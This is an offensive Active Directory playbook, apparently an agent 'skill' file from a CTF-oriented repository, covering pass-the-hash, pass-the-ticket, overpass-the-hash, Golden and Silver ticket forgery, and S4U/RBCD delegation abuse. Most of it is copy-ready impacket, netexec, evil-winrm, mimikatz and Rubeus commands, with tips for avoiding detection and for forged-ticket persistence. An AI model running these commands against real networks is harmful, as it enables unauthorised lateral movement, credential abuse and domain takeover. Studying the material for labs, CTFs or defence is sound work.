# Pass-the-Hash / Pass-the-Ticket / Lateral Movement

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/pth-ptt-lateral.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/pth-ptt-lateral.md)

---

---
name: pth-ptt-lateral
category: active-directory
triggers: ["pass the hash", "pth", "pass the ticket", "ptt", "overpass the hash", "pass the key", "golden ticket", "silver ticket", "wmiexec", "psexec", "evil-winrm", "ccache", "KRB5CCNAME", "S4U", "lateral movement"]
tools: ["netexec/nxc", "impacket-wmiexec", "impacket-psexec", "impacket-smbexec", "evil-winrm", "impacket-getTGT", "impacket-ticketer", "impacket-getST", "mimikatz", "Rubeus"]
priority: high
description: Reuse recovered NT hashes and Kerberos tickets to move laterally (PtH, OPtH, PtT) and forge Golden/Silver/S4U tickets for persistence and privilege escalation.
---
# Pass-the-Hash / Pass-the-Ticket / Lateral Movement

## Trigger context
You have credential material short of a plaintext password: an NT hash (from dump/DCSync/roast), a Kerberos AES key, or a `.ccache`/`.kirbi` ticket. NTLM and Kerberos both accept these without the cleartext, so you can authenticate, execute, and pivot. Also covers forging tickets once you own `krbtgt` (Golden) or a service account (Silver), and S4U/RBCD abuse.

## Objective
Turn a hash/ticket into remote code execution on target hosts, escalate via delegation, and establish forged-ticket persistence.

## Methodology (decision tree)
```
What do you hold?
├── NT hash → PtH: nxc/wmiexec/psexec -H hash   (works where the account is local admin)
│             └── want Kerberos? Overpass-the-Hash: getTGT -hashes → ccache → PtT
├── AES key → Pass-the-Key: getTGT -aesKey → ccache
├── .ccache / .kirbi → PtT: KRB5CCNAME=t.ccache <tool> -k -no-pass
├── krbtgt hash + domain SID → Golden Ticket (impersonate anyone, incl. non-existent admin)
├── service acct hash + SPN → Silver Ticket (forge TGS for one service, no DC contact)
└── delegation rights (RBCD / constrained) → getST S4U → impersonate a user to a service
Where to land? nxc confirms (Pwn3d!) → pick exec channel (wmi/psexec/winrm/smbexec)
```

## Commands & payloads
```bash
# --- Pass-the-Hash: validate then execute ---
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH               # sweep; (Pwn3d!) = local admin
nxc smb TARGET -u Administrator -H NTHASH -x 'whoami'          # command exec
impacket-wmiexec -hashes :NTHASH corp.local/Administrator@TARGET      # semi-interactive, stealthy
impacket-psexec  -hashes :NTHASH corp.local/Administrator@TARGET      # SYSTEM, drops service (loud)
impacket-smbexec -hashes :NTHASH corp.local/Administrator@TARGET      # no file drop
evil-winrm -i TARGET -u Administrator -H NTHASH                        # if WinRM (5985) open

# --- Overpass-the-Hash / Pass-the-Key: hash/AES → Kerberos TGT ---
impacket-getTGT -hashes :NTHASH corp.local/jdoe -dc-ip DC_IP           # → jdoe.ccache
impacket-getTGT -aesKey AES256KEY corp.local/jdoe -dc-ip DC_IP
export KRB5CCNAME=jdoe.ccache
nxc smb DC_HOST_FQDN -k --use-kcache                                   # use the ticket
impacket-wmiexec -k -no-pass corp.local/jdoe@DC_HOST_FQDN

# --- Pass-the-Ticket (already have a ccache/kirbi) ---
export KRB5CCNAME=/path/ticket.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC_HOST_FQDN
# convert .kirbi ↔ .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# --- Golden Ticket (own krbtgt hash + domain SID) ---
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC_HOST_FQDN

# --- Silver Ticket (own a service acct hash; forge TGS for one SPN, no DC needed) ---
impacket-ticketer -nthash SVC_NTHASH -domain-sid S-1-5-21-... -domain corp.local \
    -spn cifs/host.corp.local Administrator

# --- RBCD / Constrained delegation abuse (S4U) ---
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
    -hashes :ATTACKER_COMPUTER_HASH corp.local/ATTACK$ -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@target.corp.local
```

Windows equivalents:
```powershell
# Mimikatz PtH (spawns process with injected hash)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTHASH /run:cmd.exe
# Rubeus OPtH / PtT
Rubeus.exe asktgt /user:jdoe /rc4:NTHASH /ptt
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt
Rubeus.exe s4u /user:ATTACK$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

Exec-channel selection cheat sheet:
```
Port 445 SMB, local admin   → wmiexec (quiet) / smbexec / atexec / psexec (SYSTEM, loud)
Port 5985/5986 WinRM        → evil-winrm (-H hash or -k ccache) — most interactive
MSSQL (1433), db creds      → mssqlclient -windows-auth → xp_cmdshell / relay
DCOM only                   → dcomexec.py
Kerberos-only environment   → any impacket tool with -k -no-pass + KRB5CCNAME
```

Verifying/inspecting tickets:
```bash
export KRB5CCNAME=t.ccache && nxc smb DC_HOST_FQDN -k --use-kcache   # validate a ticket works
impacket-describeTicket t.ccache                                     # show flags/lifetime/etype
```

## Branching logic
- Local-admin PtH fails on modern hosts for LOCAL accounts (UAC remote restriction / LocalAccountTokenFilterPolicy) — use a DOMAIN admin account instead, or the built-in RID-500 which is exempt.
- Only WinRM open -> `evil-winrm`; only SMB -> wmiexec/psexec/smbexec.
- AES-only environment or want stealth -> prefer Kerberos (OPtH/PtT) over NTLM PtH (NTLM auth is more heavily monitored).
- Own `krbtgt` -> Golden Ticket = domain persistence (survives password changes of others). Own a service hash only -> Silver Ticket (scoped, offline, no DC logs).
- Have `AllowedToDelegate`/RBCD write -> S4U (`getST -impersonate`) to become any user against that service.

## Common pitfalls
- Kerberos requires the target's FQDN, not IP (`@DC_HOST_FQDN`), and correct DNS + clock (skew -> KRB_AP_ERR_SKEW).
- `-hashes` format is `LMHASH:NTHASH`; use `:NTHASH` (empty LM) — a bad LM half breaks some tools.
- Golden/Silver need the correct **domain SID** (from `impacket-lookupsid` or `nxc --rid-brute`), not a user SID.
- Silver tickets: SPN class must match the service you target (cifs, http, mssqlsvc, host); wrong SPN = access denied.
- psexec is noisy (creates a service, Event 7045) and often flagged — prefer wmiexec/atexec for quiet exec.
- Ticket file env var must be exported (`export KRB5CCNAME=...`) in the SAME shell that runs the tool.
- Machine account `$` names and passwords are case/format sensitive; keep the trailing `$`.

## Proof / verification
- `nxc smb TARGET -u user -H NTHASH` -> `[+] ... (Pwn3d!)`.
- Exec channel returns a shell / command output (`whoami` -> `nt authority\system` or the target user).
- `klist` (or `KRB5CCNAME` + tool success) confirms a usable ticket.

## Cross-references
- [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md) — source of NT hashes and the `krbtgt` key for Golden Tickets.
- [sa--instructions--active-directory--kerberoasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--kerberoasting.md) / [sa--instructions--active-directory--asreproasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--asreproasting.md) — provide service/user hashes to reuse.
- [sa--instructions--active-directory--adcs-esc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--adcs-esc.md) — `certipy auth` emits a `.ccache` for Pass-the-Ticket.
- [sa--instructions--active-directory--ntlm-relay-coerce.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ntlm-relay-coerce.md) — RBCD setup that this file's S4U step abuses.
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — map which hosts an owned account can reach.

## Credible sources
- https://www.thehacker.recipes/ad/movement/ntlm/pth
- https://www.thehacker.recipes/ad/movement/kerberos/ptt
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html
- https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain
- https://github.com/fortra/impacket/blob/master/examples/getST.py
